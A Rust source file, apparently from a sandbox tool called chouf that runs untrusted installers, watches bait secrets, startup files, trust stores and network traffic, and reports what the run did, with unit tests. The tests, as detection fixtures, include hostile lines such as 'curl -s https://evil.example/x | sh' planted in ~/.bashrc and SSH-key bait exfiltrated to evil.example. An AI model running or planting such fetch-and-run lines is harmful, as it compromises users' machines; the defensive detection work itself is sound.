                "steps": x.steps.iter().map(|d| json!({"did": describe_short(d), "exit": d.exit, "timed_out": d.timed_out})).collect::<Vec<_>>(),
                "verdict": match &x.verdict {
                    Ok(v) => json!({"level": v.level, "summary": v.summary,
                        "points": v.points.iter().map(|p| json!({"says": p.says, "does": p.does, "assessment": p.assessment})).collect::<Vec<_>>()}),
                    Err(e) => json!({"unavailable": e}),
                },
            })),
        })
    }

    pub fn text(&self) -> String {
        let o = self.outcome;
        let end = if o.timed_out {
            "stopped: time limit".to_string()
        } else {
            format!("exit {}", o.exit.map_or("?".into(), |c| c.to_string()))
        };
        let mut s = format!(
            "chouf · {} · {} · {:.1} s · {}\n$ {}\n",
            self.id,
            self.image,
            o.elapsed.as_secs_f64(),
            end,
            self.cmd
                .iter()
                .map(|a| quote(a))
                .collect::<Vec<_>>()
                .join(" ")
        );
        s += &in_short(&self.findings, self.activity.as_ref().ok().copied(), self.canaries, failure(o).as_deref());
        if let Some(x) = &self.exploration {
            s += &format!("\n{}\n", t("How chouf explored it"));
            for (i, d) in x.steps.iter().enumerate() {
                s += &format!("   [{}] {}\n", i + 1, describe_short(d));
            }
            if let Some(n) = &x.note {
                s += &format!("   ({n})\n");
            }
        }
        if !self.triggered.is_empty() {
            s += &format!("\n{}\n", t("What it set up, set off once by chouf"));
            for d in self.triggered {
                s += &format!("   {}\n", describe_short(d));
            }
        }
        if self.findings.is_empty() {
            s += &format!("\n{}\n", t("Nothing: no bait touched, no file changed."));
        }
        let mut last = None;
        let others = self.findings.iter().filter(|f| f.kind == Kind::Other).count();
        let mut shown_others = 0;
        for f in &self.findings {
            if last != Some(f.kind) {
                s += &format!("\n{}\n", t(f.kind.title()));
                last = Some(f.kind);
            }
            // ordinary changes: a short sample in the terminal, all of them in report.json and report.html
            if f.kind == Kind::Other {
                shown_others += 1;
                if shown_others > OTHER_LINES {
                    if shown_others == OTHER_LINES + 1 {
                        s += &format!("   {}\n", tf("and {} more (report.html has them all)", &[&(others - OTHER_LINES).to_string()]));
                    }
                    continue;
                }
            }
            let mark = if f.kind == Kind::Other { " " } else { "!" };
            let mut notes: Vec<String> = Vec::new();
            if !f.why.is_empty() {
                notes.push(crate::i18n::why(&f.why));
            }
            if !f.package.is_empty() {
                notes.push(tf("package {}", &[&f.package]));
            }
            let why = if notes.is_empty() { String::new() } else { format!("  ({})", notes.join(" · ")) };
            let path = if f.count > 1 { tf("{} files in {}", &[&f.count.to_string(), &f.path]) } else { f.path.clone() };
            let did: Vec<String> = f.did.iter().map(|d| t(d)).collect();
            s += &format!(" {mark} {:<9} {}{}\n", did.join(", "), path, why);
            // who did it matters for an alarm; for an ordinary change it is noise
            let by: &[String] = if f.kind == Kind::Other { &[] } else { &f.by };
            for l in f.lines.iter().take(4) {
                s += &format!("   {:<9} + {}\n", "", l.chars().take(150).collect::<String>());
            }
            if f.lines.len() > 4 {
                s += &format!("   {:<9} {}\n", "", tf("and {} more", &[&(f.lines.len() - 4).to_string()]));
            }
            for b in by.iter().take(3) {
                s += &format!("   {:<9} {} {b}\n", "", t("by"));
            }
            if by.len() > 3 {
                s += &format!("   {:<9} {}\n", "", tf("and {} more", &[&(by.len() - 3).to_string()]));
            }
        }
        match &self.activity {
            Ok(a) => {
                if !a.blocked.is_empty() {
                    s += &format!("\n{}\n", t("What chouf refused on your local network"));
                    for b in a.blocked.iter().take(20) {
                        s += &format!(" ! {}:{} {}  {} {}\n", b.ip, b.port, b.proto, t("by"), a.who(b.pid, i64::MAX));
                    }
                    if a.blocked.len() > 20 {
                        s += &format!("   and {} more\n", a.blocked.len() - 20);
                    }
                }
                if !a.leaks.is_empty() {
                    s += &format!("\n{}\n", t("What left the machine (bait data seen in what it sent)"));
                    for l in a.leaks.iter().take(10) {
                        let what = leaked(self.canaries, l).map(|c| t(c.what)).unwrap_or_else(|| t("one of your secrets"));
                        let dest = l.name.clone().unwrap_or_else(|| l.ip.clone());
                        s += &format!(" ! {what} → {dest} port {}  {} {}\n      \"{}\"\n", l.port, t("by"), a.who(l.pid, i64::MAX), l.excerpt);
                    }
                }
                if !a.conns.is_empty() {
                    s += &format!("\n{}\n", t("Where it connected"));
                    for c in a.conns.iter().take(30) {
                        let dest = match &c.name {
                            Some(n) => format!("{n} ({})", c.ip),
                            None => c.ip.clone(),
                        };
                        let bytes = if c.sent + c.received > 0 { format!(" · {}", tf("sent {}, received {}", &[&kb(c.sent), &kb(c.received)])) } else { String::new() };
                        s += &format!("   {dest} port {} {}{bytes}  {} {}\n", c.port, c.proto, t("by"), a.who(c.pid, i64::MAX));
                    }
                    if a.conns.len() > 30 {
                        s += &format!("   and {} more\n", a.conns.len() - 30);
                    }
                }
                let tree = a.tree();
                if !tree.is_empty() {
                    s += &format!("\n{} ({})\n", t("Programs it ran"), tree.len());
                    let shown = fold_package_managers(&tree);
                    for (depth, cmd, exit, hidden) in shown.iter().take(40) {
                        let code = match exit {
                            Some(0) | None => String::new(),
                            Some(c) => format!("  (exit {c})"),
                        };
                        let more = if *hidden > 0 { format!("  {}", tf("(+{} of its own programs)", &[&hidden.to_string()])) } else { String::new() };
                        s += &format!("   {}{cmd}{code}{more}\n", "  ".repeat((*depth).min(8)));
                    }
                    if shown.len() > 40 {
                        s += &format!("   {}\n", tf("and {} more (report.json has them all)", &[&(shown.len() - 40).to_string()]));
                    }
                }
                if a.lost {
                    s += &format!("\n{}\n", t("Warning: the kernel tracer lost events, the lists above may be incomplete."));
                }
            }
            Err(why) => s += &format!("\n({why})\n"),
        }
        if let Some(x) = &self.exploration {
            s += &format!("\n{}  {}\n", t("What it says vs what it does"), tf("(opinion of {}, not a measurement)", &[&x.model]));
            match &x.verdict {
                Ok(v) => {
                    let mark = match v.level.as_str() {
                        "consistent" => t("consistent: it does what it says"),
                        "suspicious" => t("SUSPICIOUS: it does things it does not explain"),
                        _ => t("MALICIOUS: it steals, hides or contradicts itself"),
                    };
                    s += &format!("   {mark}\n   {}\n", v.summary);
                    for p in &v.points {
                        let sign = match p.assessment.as_str() {
                            "consistent" => "ok",
                            "contradicts" => "!!",
                            _ => " ?",
                        };
                        s += &format!("   {sign} {} {}\n      {} {}\n", t("says:"), p.says, t("does:"), p.does);
                    }
                }
                Err(e) => s += &format!("   ({e})\n"),
            }
        }
        if self.transient > 0 {
            s += &format!("\n{}\n", tf("({} temporary files or folders created and removed in ~)", &[&self.transient.to_string()]));
        }
        if self.outside > 0 {
            s += &format!("\n{}\n", tf("({} baits touched from your own machine during the run, not from the sandbox: left out)", &[&self.outside.to_string()]));
        }
        if self.incomplete {
            s += &format!("\n{}\n", t("Warning: some file events were lost, this list may be incomplete."));
        }
        s
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn touches(list: &[(&str, &[Op])]) -> Touches {
        let mut t = Touches::default();
        for (p, ops) in list {
            t.ops
                .insert(PathBuf::from(p), ops.iter().copied().collect());
        }
        t
    }

    #[test]
    fn the_command_is_shown_as_it_ran() {
        let cmd = ["sh", "-c", "curl -fsSL x | sh", "it's"].map(String::from);
        let shown: Vec<String> = cmd.iter().map(|a| quote(a)).collect();
        assert_eq!(shown.join(" "), r"sh -c 'curl -fsSL x | sh' 'it'\''s'");
    }

    #[test]
    fn classifies_like_a_human_would() {
        let canaries = vec![
            Canary {
                path: ".ssh/id_ed25519".into(),
                what: "SSH private key",
                group: crate::canary::PRIVATE, mark: String::new(),
            },
            Canary {
                path: ".aws/credentials".into(),
                what: "AWS access keys",
                group: crate::canary::DEV, mark: String::new(),
            },
        ];
        let home = touches(&[
            (".ssh/id_ed25519", &[Op::Open, Op::Read]),
            (".aws", &[Op::List]),
            (".bashrc", &[Op::Open, Op::Read, Op::Write]),
            (".profile", &[Op::Open, Op::Read]), // a shell starting: not news
            ("notes.txt", &[Op::Create, Op::Write]),
            (".local/bin/tmp.x", &[Op::Create, Op::Delete]), // a temporary folder...
            (".local/bin/tmp.x/uv", &[Op::Create, Op::Write, Op::Move]), // ...and what was in it
            (".cache/a", &[Op::Create, Op::Write, Op::Delete]),
        ]);
        assert_eq!(transient_count(&home), 2);
        let sys = FsDiff {
            added: vec![
                "/etc/cron.d/update".into(),
                "/usr/bin/tool".into(),
                "/etc/apt/sources.list.d/x.list".into(),
            ],
            changed: vec![],
            deleted: vec![],
        };
        let f = findings(&canaries, &home, &sys, &Packages::default());
        let got: Vec<(Kind, &str)> = f.iter().map(|f| (f.kind, f.path.as_str())).collect();
        assert_eq!(
            got,
            vec![
                (Kind::Secret, "~/.aws"),
                (Kind::Secret, "~/.ssh/id_ed25519"),
                (Kind::Persistence, "/etc/cron.d/update"),
                (Kind::Persistence, "~/.bashrc"),
                (Kind::Trust, "/etc/apt/sources.list.d/x.list"),
                (Kind::Other, "/usr/bin/tool"),
                (Kind::Other, "~/notes.txt"),
            ]
        );
        assert_eq!(f[1].why, "SSH private key");
        assert_eq!(f[1].did, vec!["opened", "read"]);
    }

    #[test]
    fn in_short_speaks_plainly_and_gives_advice() {
        let f = |kind, path: &str, group| Finding { kind, path: path.into(), did: vec!["read"], why: String::new(), by: vec![], group, count: 1, package: String::new(), lines: vec![] };
        let findings = vec![
            f(Kind::Secret, "~/.config/Exodus/exodus.wallet/seed.seco", crate::canary::WALLETS),
            f(Kind::Secret, "~/.config/BraveSoftware/Brave-Browser/Default/Login Data", crate::canary::PASSWORDS),
            f(Kind::Persistence, "/etc/cron.d/x", ""),
        ];
        let s = in_short(&findings, None, &[], None);
        assert!(s.contains("It went through your crypto wallets, passwords and browser logins: 2 bait files."), "{s}");
        assert!(s.contains("run again on its own (1 way)") && s.contains("new wallet") && s.contains("/etc/cron.d/x"), "{s}");
        assert!(in_short(&[f(Kind::Other, "/tmp/x", "")], None, &[], None).contains("Nothing alarming"));
    }

    #[test]
    fn the_standard_certificate_bundle_is_not_a_new_trust_but_a_custom_root_is() {
        let mut added: Vec<String> = (0..8).map(|i| format!("/usr/share/ca-certificates/mozilla/Root_{i}.crt")).collect();
        added.extend((0..8).map(|i| format!("/etc/ssl/certs/Root_{i}.pem")));
        added.extend((0..8).map(|i| format!("/etc/ssl/certs/{i:08x}.0")));
        added.push("/etc/ssl/certs/ca-certificates.crt".into());
        added.push("/etc/ssl/certs/Evil_CA.pem".into());
        let sys = FsDiff { added: added.clone(), changed: vec![], deleted: vec![] };
        let f = findings(&[], &Touches::default(), &sys, &Packages::default());
        let trust: Vec<&str> = f.iter().filter(|f| f.kind == Kind::Trust).map(|f| f.path.as_str()).collect();
        assert_eq!(trust, vec!["/etc/ssl/certs/Evil_CA.pem"], "only the root that is not Mozilla's stays an alarm");
        // the 17 ordinary links fold into one line, the 8 Mozilla files into another
        let certs = f.iter().find(|f| f.kind == Kind::Other && f.path == "/etc/ssl/certs/").unwrap();
        assert_eq!((certs.count, certs.why.as_str()), (17, "standard root certificates (ca-certificates package)"));
        // a custom root in the local folder: nothing is excused
        let mut sys = sys;
        sys.added.push("/usr/local/share/ca-certificates/corp.crt".into());
        let f = findings(&[], &Touches::default(), &sys, &Packages::default());
        let alarms: usize = f.iter().filter(|f| f.kind == Kind::Trust && f.path.starts_with("/etc/ssl/certs/")).map(|f| f.count).sum();
        assert_eq!(alarms, 18, "every certificate is an alarm again: {f:?}");
    }

    #[test]
    fn a_tool_reading_its_own_settings_is_not_a_theft_but_anything_else_is() {
        use serde_json::json;
        let canaries = vec![Canary { path: ".npmrc".into(), what: "npm publish token", group: crate::canary::DEV, mark: String::new() }];
        let home = touches(&[(".npmrc", &[Op::Open, Op::Read])]);
        let run_with = |events: Vec<serde_json::Value>, sys: &FsDiff| {
            let a = Activity::from_events(&events, false);
            let mut f = findings(&canaries, &home, sys, &Packages::default());
            attribute(&mut f, &a, sys);
            f
        };
        let run = |events: Vec<serde_json::Value>| run_with(events, &FsDiff::default());
        let npm = json!({"kind":"exec","t":1,"pid":10,"ppid":1,"comm":"node","file":"/usr/local/bin/node","args":["node","/usr/local/bin/npm","install"]});
        let read = |pid| json!({"kind":"open","t":5,"pid":pid,"comm":"node","path":"/root/.npmrc","mode":"read","create":false});
        let f = run(vec![npm.clone(), read(10)]);
        assert_eq!(f[0].kind, Kind::Other, "{f:?}");
        assert_eq!(f[0].why, "npm publish token, read by its own tool: npm");
        assert!(in_short(&f, None, &[], None).contains("It read one of its own settings (~/.npmrc)"));
        // the classic attack: an install script, not npm, reads the token
        let postinstall = json!({"kind":"exec","t":2,"pid":11,"ppid":10,"comm":"node","file":"/usr/local/bin/node","args":["node","install.js"]});
        let f = run(vec![npm.clone(), postinstall, read(10), read(11)]);
        assert_eq!(f[0].kind, Kind::Secret, "{f:?}");
        // a program merely named after nothing it owns, or an unknown process: still an alarm
        let f = run(vec![read(99)]);
        assert_eq!(f[0].kind, Kind::Secret);
        // a fake npm the program dropped (or swapped in) during the run is not npm
        let fake = FsDiff { added: vec!["/usr/local/bin/npm".into()], changed: vec![], deleted: vec![] };
        let f = run_with(vec![npm.clone(), read(10)], &fake);
        assert!(f.iter().any(|f| f.path == "~/.npmrc" && f.kind == Kind::Secret), "{f:?}");
        // the real node running a fake npm script the program dropped: not excused
        let spoof = json!({"kind":"exec","t":1,"pid":12,"ppid":1,"comm":"node","file":"/usr/local/bin/node","args":["node","/tmp/evil/npm","ci"]});
        let dropped = FsDiff { added: vec!["/tmp/evil/npm".into()], changed: vec![], deleted: vec![] };
        let f = run_with(vec![spoof, read(12)], &dropped);
        assert!(f.iter().any(|f| f.path == "~/.npmrc" && f.kind == Kind::Secret), "{f:?}");
    }

    #[test]
    fn a_leak_names_the_secret_even_base64_encoded() {
        let cans = vec![
            Canary { path: ".aws/credentials".into(), what: "AWS access keys", group: crate::canary::DEV, mark: "0123456789abcdef01".into() },
            Canary { path: ".ssh/id_ed25519".into(), what: "SSH private key", group: crate::canary::PRIVATE, mark: "0123456789abcdef00".into() },
        ];
        let leak = |excerpt: &str| Leak { pid: 1, ip: "1.2.3.4".into(), port: 443, name: Some("evil.example".into()), pattern: 0, excerpt: excerpt.into() };
        assert_eq!(leaked(&cans, &leak("key=AKIA0123456789ABCDEF01&x")).unwrap().what, "AWS access keys");
        // "b3BlbnNzaC...": base64 of a line holding the SSH bait's mark, at an odd offset
        let b64 = crate::canary::tests_base64(b"xx-----BEGIN 0123456789abcdef00chouf");
        assert_eq!(leaked(&cans, &leak(&format!("data={b64}"))).unwrap().what, "SSH private key");
        assert!(leaked(&cans, &leak("nothing here")).is_none());
    }

    fn home_with(files: &[(&str, &str)]) -> std::path::PathBuf {
        use std::sync::atomic::{AtomicUsize, Ordering};
        static N: AtomicUsize = AtomicUsize::new(0);
        let d = std::env::temp_dir().join(format!("chouf-home-{}-{}", std::process::id(), N.fetch_add(1, Ordering::SeqCst)));
        let _ = std::fs::remove_dir_all(&d);
        for (rel, body) in files {
            let p = d.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, body).unwrap();
        }
        d
    }

    fn startup(path: &str) -> Finding {
        Finding { kind: Kind::Persistence, path: path.into(), did: vec!["written"], why: "runs in every new terminal".into(), by: vec![], group: "", count: 1, package: String::new(), lines: vec![] }
    }

    #[test]
    fn a_language_installer_putting_its_folder_in_path_is_ordinary_but_taking_over_sudo_is_not() {
        let bashrc = crate::canary::planted(".bashrc").unwrap();
        let rustup_env = "#!/bin/sh\n# rustup shell setup\ncase \":${PATH}:\" in\n    *:\"$HOME/.cargo/bin\":*)\n        ;;\n    *)\n        export PATH=\"$HOME/.cargo/bin:$PATH\"\n        ;;\nesac\n";
        let rustup = format!("{bashrc}. \"$HOME/.cargo/env\"\n");
        let home = home_with(&[(".bashrc", &rustup), (".cargo/env", rustup_env), (".cargo/bin/cargo", ""), (".cargo/bin/rustc", "")]);
        let mut f = vec![startup("~/.bashrc")];
        startup_lines(&mut f, &home);
        assert_eq!((f[0].kind, f[0].why.as_str()), (Kind::Other, "adds to PATH: ~/.cargo/bin"), "{f:?}");
        assert_eq!(f[0].lines, vec![". \"$HOME/.cargo/env\""]);
        let s = in_short(&f, None, &[], None);
        assert!(s.contains("It adds ~/.cargo/bin to your PATH (in ~/.bashrc)") && s.contains("Nothing alarming"), "{s}");

        // the same, with a sudo of its own in that folder: it takes over the command people type their password into
        let home = home_with(&[(".bashrc", &rustup), (".cargo/env", rustup_env), (".cargo/bin/sudo", "")]);
        let mut f = vec![startup("~/.bashrc")];
        startup_lines(&mut f, &home);
        assert_eq!(f[0].kind, Kind::Persistence);
        assert_eq!(f[0].why, format!("{TAKES_OVER}sudo"));

        // anything more than PATH stays a way back, its lines shown, and the advice is to take them out, not the file
        for added in ["curl -s https://evil.example/x | sh", "export PATH=\"$(curl evil.example):$PATH\"", ". \"$HOME/.nvm/nvm.sh\"", "export PATH=\"/tmp/x:$PATH\""] {
            let home = home_with(&[(".bashrc", &format!("{bashrc}{added}\n")), (".nvm/nvm.sh", "nvm() { :; }\n")]);
            let mut f = vec![startup("~/.bashrc")];
            startup_lines(&mut f, &home);
            assert_eq!((f[0].kind, f[0].lines.clone()), (Kind::Persistence, vec![added.to_string()]), "{added}");
            let s = in_short(&f, None, &[], None);
            assert!(s.contains("take out the lines it added to ~/.bashrc") && !s.contains("remove what it set up"), "{s}");
        }
        // an env file with more than PATH in it
        let home = home_with(&[(".bashrc", &rustup), (".cargo/env", "export PATH=\"$HOME/.cargo/bin:$PATH\"\ncurl evil.example | sh\n")]);
        let mut f = vec![startup("~/.bashrc")];
        startup_lines(&mut f, &home);
        assert_eq!(f[0].kind, Kind::Persistence);
    }

    #[test]
    fn a_startup_file_replaced_by_a_pipe_or_a_link_is_not_read() {
        let home = home_with(&[]);
        std::fs::create_dir_all(&home).unwrap();
        std::os::unix::fs::symlink("/etc/hostname", home.join(".bashrc")).unwrap();
        assert!(small_file(&home.join(".bashrc")).is_none());
        let fifo = home.join(".profile");
        let c = std::ffi::CString::new(fifo.to_string_lossy().as_bytes()).unwrap();
        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
        assert!(small_file(&fifo).is_none(), "would block forever");
    }

    #[test]
    fn packages_and_sources_are_named_not_alarmed() {
        let pf = |path: &str, why: &str, package: &str| Finding { kind: Kind::Other, path: path.into(), did: vec!["added"], why: why.into(), by: vec![], group: "", count: 1, package: package.into(), lines: vec![] };
        let mut source = pf("/etc/apt/sources.list.d/docker.list", "adds a software source", "");
        source.kind = Kind::Trust;
        source.lines = vec!["https://download.docker.com/linux/ubuntu".into()];
        let mut key = pf("/etc/apt/keyrings/docker.asc", "trusts a new signing key", "");
        key.kind = Kind::Trust;
        let f = vec![pf("/etc/init.d/docker", "boot script", "docker-ce"), pf("/etc/systemd/system/sysinit.target.wants/", "system service", "dbus, systemd"), source, key];
        let s = in_short(&f, None, &[], None);
        assert!(s.contains("Packages it installed will start with the machine: dbus, docker-ce, systemd"), "{s}");
        assert!(s.contains("!! It added a software source: https://download.docker.com/linux/ubuntu."), "{s}");
        assert!(!s.contains("It changed what the machine trusts") && !s.contains("run again on its own"), "the key goes with its source: {s}");
    }

    #[test]
    fn a_run_that_failed_says_so_with_its_last_words() {
        let o = |exit, err: &str| Outcome { exit, timed_out: false, stdout: vec![], stderr: err.as_bytes().to_vec(), elapsed: std::time::Duration::ZERO, fs: FsDiff::default() };
        let f = failure(&o(Some(1), ">>> Installing\n\x1b[1m\x1b[31mERROR:\x1b(B\x1b[m This version requires zstd\n\n")).unwrap();
        assert!(f.contains("exit 1") && f.ends_with("Its last message: ERROR: This version requires zstd"), "{f}");
        assert!(failure(&o(Some(0), "x")).is_none());
        assert!(in_short(&[], None, &[], Some(&f)).contains("!  It stopped on an error (exit 1)"));
    }

    #[test]
    fn what_runs_under_a_package_manager_is_folded_into_it() {
        let tree: Vec<(usize, String, Option<i64>)> = [(0, "sh -c x"), (1, "apt-get update -qq"), (2, "/usr/lib/apt/methods/http"), (3, "gpgv"), (1, "curl https://x"), (1, "/usr/bin/dpkg --unpack a.deb"), (2, "postinst")]
            .iter().map(|(d, c)| (*d, c.to_string(), None)).collect();
        let folded = fold_package_managers(&tree);
        let shown: Vec<(usize, &str, usize)> = folded.iter().map(|(d, c, _, n)| (*d, c.as_str(), *n)).collect();
        assert_eq!(shown, vec![(0, "sh -c x", 0), (1, "apt-get update -qq", 2), (1, "curl https://x", 0), (1, "/usr/bin/dpkg --unpack a.deb", 1)]);
    }

    #[test]
    fn only_what_left_after_the_first_look_at_a_bait_is_counted() {
        use serde_json::json;
        let cans = vec![Canary { path: ".ssh/id_ed25519".into(), what: "SSH private key", group: crate::canary::PRIVATE, mark: "m".into() }];
        let conn = |t: i64, ip: &str| json!({"kind":"connect","t":t,"pid":1,"ip":ip,"port":443});
        let close = |ip: &str, sent: u64| json!({"kind":"close","t":900,"pid":1,"ip":ip,"port":443,"sent":sent,"received":0});
        let a = Activity::from_events(&[
            conn(50, "10.0.0.1"), close("10.0.0.1", 5000), // the apt download, before
            json!({"kind":"open","t":100,"pid":1,"comm":"cat","path":"/root/.ssh/id_ed25519","mode":"read","create":false}),
            conn(200, "10.0.0.2"), close("10.0.0.2", 2048),
        ], false);
        let f = vec![Finding { kind: Kind::Secret, path: "~/.ssh/id_ed25519".into(), did: vec!["read"], why: String::new(), by: vec![], group: crate::canary::PRIVATE, count: 1, package: String::new(), lines: vec![] }];
        let s = in_short(&f, Some(&a), &cans, None);
        assert!(s.contains("After reading your secrets it sent 2.0 KB to 10.0.0.2.") && !s.contains("10.0.0.1."), "{s}");
    }

    #[test]
    fn baits_touched_from_the_host_are_left_out_unless_the_tracer_lost_events() {
        use serde_json::json;
        let cans = vec![
            Canary { path: ".aws/credentials".into(), what: "AWS access keys", group: crate::canary::DEV, mark: String::new() },
            Canary { path: ".ssh/id_ed25519".into(), what: "SSH private key", group: crate::canary::PRIVATE, mark: String::new() },
        ];
        // updatedb on the host lists ~/.aws; the program inside reads the SSH key
        let home = touches(&[(".aws", &[Op::List]), (".ssh/id_ed25519", &[Op::Open, Op::Read])]);
        let events = vec![
            json!({"kind":"exec","t":1,"pid":5,"ppid":1,"comm":"cat","file":"/usr/bin/cat","args":["cat","/root/.ssh/id_ed25519"]}),
            json!({"kind":"open","t":2,"pid":5,"comm":"cat","path":"/root/.ssh/id_ed25519","mode":"read","create":false}),
        ];
        for (lost, kept) in [(false, vec!["~/.ssh/id_ed25519"]), (true, vec!["~/.aws", "~/.ssh/id_ed25519"])] {
            let a = Activity::from_events(&events, lost);
            let mut f = findings(&cans, &home, &FsDiff::default(), &Packages::default());
            attribute(&mut f, &a, &FsDiff::default());
            let dropped = from_outside(&mut f, &a);
            let paths: Vec<&str> = f.iter().map(|f| f.path.as_str()).collect();
            assert_eq!((paths, dropped), (kept, if lost { 0 } else { 1 }));
        }
    }
}
